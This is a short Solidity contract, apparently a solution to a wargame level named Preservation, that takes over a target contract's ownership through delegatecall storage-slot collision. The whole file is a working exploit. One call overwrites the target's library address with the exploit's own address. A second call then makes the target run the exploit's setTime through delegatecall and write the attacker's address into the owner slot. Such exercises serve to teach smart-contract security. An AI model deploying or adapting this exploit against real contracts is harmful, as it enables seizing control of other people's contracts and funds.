// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

interface Preservation {
    function setFirstTime(uint _timeStamp) external;
    function setSecondTime(uint _timeStamp) external;
}

/**
 * @title PreservationExploit
 * @dev Abuse the delegatecall to take ownership of the calling contract
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract PreservationExploit {
    address public timeZone1Library; // Match the contract structure
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }

    function exploit(address _contract) public {
        Preservation(_contract).setSecondTime(uint256(uint160(address(this)))); // First call sets first slot to this contract address
        Preservation(_contract).setFirstTime(uint256(uint160(msg.sender))); // Will call this contract through delegatecall so we can override owner
    }
}